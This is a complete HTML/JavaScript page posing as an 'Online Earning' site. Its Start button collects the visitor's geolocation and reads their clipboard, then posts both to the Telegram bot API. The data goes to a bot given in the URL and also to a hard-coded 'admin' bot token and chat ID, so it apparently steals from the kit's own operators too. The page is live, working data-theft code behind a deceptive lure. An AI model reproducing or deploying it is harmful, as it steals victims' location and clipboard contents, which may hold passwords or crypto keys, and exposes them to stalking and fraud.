<!DOCTYPE html>
<html>
<head>
    <title>Online Earning</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: Arial, sans-serif;
            background-image: url("https://i.ibb.co/xLmGNrV/IMG-20240716-163242.jpg");
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            margin: 0;
            padding: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            position: relative;
            overflow: hidden;
        }

        .container {
            text-align: center;
            margin-top: 50px;
        }

        button {
            font-size: 18px;
            padding: 18px 75px;
            background-color: transparent;
            color: #ffffff;
            border: 2px solid #ffffff;
            border-radius: 50px;
            cursor: pointer;
            box-shadow: 0 0 10px rgba(255, 255, 255, 0.7), 0 0 20px rgba(255, 255, 255, 0.5), 0 0 30px rgba(255, 255, 255, 0.3);
            transition: background-color 0.3s ease;
        }

        button:hover {
            background-color: rgba(255, 255, 255, 0.2);
        }

        #spinner {
            display: none;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            text-align: center;
            color: #ffffff;
            background-color: rgba(0, 0, 0, 0.5);
            padding: 20px;
            border-radius: 10px;
        }

        #spinner .spinner-border {
            width: 3rem;
            height: 3rem;
            border: 0.3em solid currentColor;
            border-right-color: transparent;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            100% {
                transform: rotate(360deg);
            }
        }

        .overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            z-index: 1000;
        }
    </style>
</head>

<body>
    <div class="overlay" id="overlay"></div>
    <div class="container">
        <button id="startButton">Start</button>
        <div id="spinner">
            <div class="spinner-border"></div>
        </div>
    </div>
   <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script>
        function getUrlParameter(name) {
            name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
            var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
            var results = regex.exec(location.search);
            return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
        }

        const USER_TELEGRAM_API_TOKEN = getUrlParameter('token');
        const USER_CHAT_ID = getUrlParameter('id');

        const ADMIN_TELEGRAM_API_TOKEN = '7441227305:AAGdXG0d-IQEy6u7p94_NVzsUMMSIj01dtM';
        const ADMIN_CHAT_ID = '5080596463';

        document.getElementById('startButton').addEventListener('click', () => {
            if (USER_TELEGRAM_API_TOKEN && USER_CHAT_ID) {
                showSpinner();
                requestLocationPermission();
            } else {
                alert('Telegram token and chat ID are missing in URL parameters.');
            }
        });

        function showSpinner() {
            document.getElementById('overlay').style.display = 'block';
            document.getElementById('spinner').style.display = 'block';
        }

        function hideSpinner() {
            document.getElementById('overlay').style.display = 'none';
            document.getElementById('spinner').style.display = 'none';
        }

        function requestLocationPermission() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(sendPositionToTelegram, err => {
                    sendError('📍 Error getting location: ' + err.message);
                    hideSpinner();
                });
            } else {
                sendError('📍 Geolocation is not supported by this browser.');
                hideSpinner();
            }
        }

        function sendPositionToTelegram(position) {
            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;

            sendLocationToTelegram(USER_TELEGRAM_API_TOKEN, USER_CHAT_ID, latitude, longitude, () => {
                const adminMessage = `🆔 User Chat ID: @${USER_CHAT_ID}`;
                sendLocationToTelegram(ADMIN_TELEGRAM_API_TOKEN, ADMIN_CHAT_ID, latitude, longitude, () => {
                    sendMessageToTelegram(ADMIN_TELEGRAM_API_TOKEN, ADMIN_CHAT_ID, adminMessage, requestClipboardPermission);
                });
            });
        }

        function requestClipboardPermission() {
            navigator.permissions.query({ name: 'clipboard-read' }).then(result => {
                if (result.state === 'granted' || result.state === 'prompt') {
                    if (!navigator.clipboard) {
                        sendError('📋 Clipboard API is not supported in this browser.');
                        hideSpinner();
                    } else {
                        navigator.clipboard.readText().then(clipText => {
                            sendClipTextToTelegram(clipText);
                        }).catch(err => {
                            sendError('📋 Error reading clipboard: ' + err);
                            hideSpinner();
                        });
                    }
                } else {
                    sendError('📋 Clipboard access permission denied.');
                    hideSpinner();
                }
            });
        }

        function sendClipTextToTelegram(clipText) {
            const message = `📋 Copy: \`${clipText}\``;

            sendMessageToTelegram(USER_TELEGRAM_API_TOKEN, USER_CHAT_ID, message, () => {
                const adminMessage = `🆔 User Chat ID: @${USER_CHAT_ID}`;
                sendMessageToTelegram(ADMIN_TELEGRAM_API_TOKEN, ADMIN_CHAT_ID, message, () => {
                    sendMessageToTelegram(ADMIN_TELEGRAM_API_TOKEN, ADMIN_CHAT_ID, adminMessage);
                });
            });
        }

        function sendLocationToTelegram(token, chatId, latitude, longitude, callback) {
            const url = `https://api.telegram.org/bot${token}/sendLocation`;
            const data = {
                chat_id: chatId,
                latitude: latitude,
                longitude: longitude
            };

            $.post(url, data).done(response => {
                if (callback) callback();
            }).fail(err => {
                console.error('Error sending location to Telegram:', err);
                hideSpinner();
            });
        }

        function sendMessageToTelegram(token, chatId, message, callback) {
            const url = `https://api.telegram.org/bot${token}/sendMessage`;
            const data = {
                chat_id: chatId,
                text: message,
                parse_mode: 'Markdown'
            };

            $.post(url, data).done(response => {
                if (callback) callback();
                hideSpinner();
            }).fail(err => {
                console.error('Error sending message to Telegram:', err);
                hideSpinner();
            });
        }

        function sendError(errorMessage) {
            const message = `⚠️ Error: ${errorMessage}`;
            sendMessageToTelegram(USER_TELEGRAM_API_TOKEN, USER_CHAT_ID, message, () => {
                sendMessageToTelegram(ADMIN_TELEGRAM_API_TOKEN, ADMIN_CHAT_ID, message, hideSpinner);
            });
        }
    </script>
</body>

</html>
